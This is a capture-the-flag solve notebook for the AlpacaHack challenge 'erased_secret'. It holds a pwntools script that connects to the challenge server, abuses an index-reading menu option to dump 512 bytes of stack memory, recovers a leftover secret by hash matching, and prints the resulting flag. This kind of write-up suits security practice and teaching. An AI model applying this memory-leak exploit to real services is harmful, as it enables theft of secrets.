<a href="https://colab.research.google.com/github/shinya00000/ctf/blob/main/alpacahack/daily-2026-04/erased_secret/erased_secret.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

In [2]:
!pip install pwntools -q

   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 12.9/12.9 MB 104.2 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.5/2.5 MB 118.5 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 223.9/223.9 kB 23.6 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 188.5/188.5 kB 20.8 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 90.6/90.6 kB 8.2 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 16.3/16.3 MB 89.0 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 74.8/74.8 kB 6.2 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 278.2/278.2 kB 23.8 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 161.0/161.0 kB 14.7 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.4/1.4 MB 87.1 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 127.4/127.4 kB 11.9 MB/s eta 0:00:00


In [5]:
from pwn import *
import hashlib
import re

def solve():
    p = remote('34.170.146.252', 36195)

    # ハッシュ値の取得
    p.recvuntil(b'hash: ')
    target_hash = p.recvline().strip().decode()
    log.info(f"Target hash: {target_hash}")

    p.recvline()

    log.info("Dumping extended stack memory...")
    dumped_data = bytearray()

    # 探索範囲を 0 から 512 に拡大（スタックのより上位のアドレスまでスキャンする）
    for i in range(512):
        p.sendlineafter(b'choice: ', b'?')
        p.sendlineafter(b'index: ', str(i).encode())
        p.recvuntil(f"mem[{i}] = 0x".encode())
        val = int(p.recvline().strip(), 16)
        dumped_data.append(val)

        # 進捗表示
        if (i + 1) % 64 == 0:
            log.info(f"Dumped {i + 1}/512 bytes...")

    # ダンプしたデータから 32バイト(文字)の 16進数文字列 を検索
    matches = re.findall(b'[0-9a-f]{32}', dumped_data)

    secret = None
    for match in matches:
        if hashlib.sha256(match).hexdigest() == target_hash:
            secret = match
            break

    if not secret:
        log.error("Secret not found. Dumped memory follows:")
        # デバッグ用：何が読み取れているかを確認するため印字
        print(dumped_data)
        return

    log.success(f"Found secret: {secret.decode()}")

    # 解答の送信
    p.sendlineafter(b'choice: ', b'!')
    p.sendlineafter(b'secret: ', secret)

    print(p.recvall().decode())

if __name__ == '__main__':
    solve()

[x] Opening connection to 34.170.146.252 on port 36195


INFO:pwnlib.tubes.remote.remote.139967990929056:Opening connection to 34.170.146.252 on port 36195


[x] Opening connection to 34.170.146.252 on port 36195: Trying 34.170.146.252


INFO:pwnlib.tubes.remote.remote.139967990929056:Opening connection to 34.170.146.252 on port 36195: Trying 34.170.146.252


[+] Opening connection to 34.170.146.252 on port 36195: Done


...

[+] Receiving all data: Done (89B)


INFO:pwnlib.tubes.remote.remote.139967990929056:Receiving all data: Done (89B)


[*] Closed connection to 34.170.146.252 port 36195


INFO:pwnlib.tubes.remote.remote.139967990929056:Closed connection to 34.170.146.252 port 36195


Alpaca{~~T\000\000 many XXXtensions: memset_s, explicit_bzero, SecureZeroMemory etc.~~}


